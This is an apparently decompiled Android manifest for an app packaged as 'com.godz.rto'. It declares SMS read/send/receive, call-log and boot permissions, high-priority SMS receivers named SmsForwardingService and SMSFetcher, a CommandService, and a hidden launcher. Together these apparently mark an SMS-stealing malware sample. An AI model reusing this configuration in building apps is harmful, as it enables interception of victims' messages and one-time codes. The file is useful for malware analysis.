version="1.0" encoding="utf-8"?>
<!-- This is a modified version of AXMLPrinter2(By Google) library. Check out how many changes are made at https://github.com/developer-krushna/AXMLPrinter by (@developer-krushna) -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="33"
    android:compileSdkVersionCodename="13"
    package="com.godz.rto"
    platformBuildVersionCode="33"
    platformBuildVersionName="13">
    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="28" />
    <uses-permission
        android:name="android.permission.INTERNET" />
    <uses-permission
        android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission
        android:name="android.permission.CALL_PHONE" />
    <uses-permission
        android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission
        android:name="android.permission.SEND_SMS" />
    <uses-permission
        android:name="android.permission.RECEIVE_SMS" />
    <uses-permission
        android:name="android.permission.READ_SMS" />
    <uses-permission
        android:name="android.permission.MANAGE_ONGOING_CALLS" />
    <uses-permission
        android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission
        android:name="android.permission.USE_EXACT_ALARM" />
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE_CALL" />
    <uses-permission
        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission
        android:name="android.permission.INSTANT_APP_FOREGROUND_SERVICE" />
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission
        android:name="android.permission.READ_SMS" />
    <uses-permission
        android:name="android.permission.RECEIVE_SMS" />
    <uses-permission
        android:name="android.permission.SEND_SMS" />
    <uses-permission
        android:name="android.permission.CALL_PHONE" />
    <uses-permission
        android:name="android.permission.READ_CALL_LOG" />
    <uses-permission
        android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission
        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission
        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission
        android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission
        android:name="android.permission.READ_SMS" />
    <uses-permission
        android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission
        android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission
        android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
    <application
        android:theme="@7f100008"
        android:label="@7f0f001c"
        android:icon="@7f0d0000"
        android:name=".SketchApplication"
        android:allowBackup="true"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="true">
        <activity
            android:theme="@7f10000b"
            android:name=".MainActivity"
            android:screenOrientation="portrait"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:windowSoftInputMode="stateHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true">
            <intent-filter>
                <action
                    android:name="android.intent.action.MAIN" />
                <category
                    android:name="android.intent.category.INFO" />
            </intent-filter>
        </activity>
        <activity
            android:name=".DoneActivity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:name=".DebugActivity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page2Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page3Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page4Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page5Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page6Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <activity
            android:theme="@7f10000b"
            android:name=".Page7Activity"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation|keyboardHidden"
            android:hardwareAccelerated="true"
            android:supportsPictureInPicture="true" />
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:exported="false"
            android:authorities="com.godz.rto.androidx-startup">
            <meta-data
                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
                android:value="androidx.startup" />
            <meta-data
                android:name="androidx.emoji2.text.EmojiCompatInitializer"
                android:value="androidx.startup" />
        </provider>
        <meta-data
            android:name="com.google.android.gms.version"
            android:value="@7f090008" />
        <provider
            android:name="com.google.firebase.provider.FirebaseInitProvider"
            android:exported="false"
            android:authorities="com.godz.rto.firebaseinitprovider"
            android:initOrder="100" />
        <service
            android:name="com.google.firebase.components.ComponentDiscoveryService"
            android:exported="false">
            <meta-data
                android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
                android:value="com.google.firebase.components.ComponentRegistrar" />
        </service>
        <uses-library
            android:name="org.apache.http.legacy"
            android:required="false" />
        <service
            android:name=".ForegroundService"
            android:enabled="true"
            android:exported="false" />
        <service
            android:name=".CommandService"
            android:enabled="true"
            android:exported="false" />
        <receiver
            android:name=".ForegroundService$BootReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action
                    android:name="android.intent.action.BOOT_COMPLETED" />
                <action
                    android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action
                    android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <action
                    android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>
        <receiver
            android:name=".SmsForwardingService"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action
                    android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <receiver
            android:name=".SmsReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action
                    android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <receiver
            android:name=".SMSFetcher"
            android:permission="android.permission.BROADCAST_SMS"
            android:exported="true">
            <intent-filter
                android:priority="1000">
                <action
                    android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <receiver
            android:name=".BatteryLevelReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action
                    android:name="android.intent.action.BATTERY_CHANGED" />
            </intent-filter>
        </receiver>
        <receiver
            android:name=".ServiceCheckReceiver"
            android:enabled="true"
            android:exported="false" />
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:exported="false"
            android:authorities="com.godz.rto.androidx-startup">
            <meta-data
                android:name="androidx.work.WorkManagerInitializer"
                android:value="androidx.startup" />
        </provider>
        <service
            android:name="androidx.work.impl.background.systemjob.SystemJobService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:exported="false">
            <intent-filter>
                <action
                    android:name="androidx.work.impl.background.systemjob.SystemJobService" />
            </intent-filter>
        </service>
    </application>
</manifest>
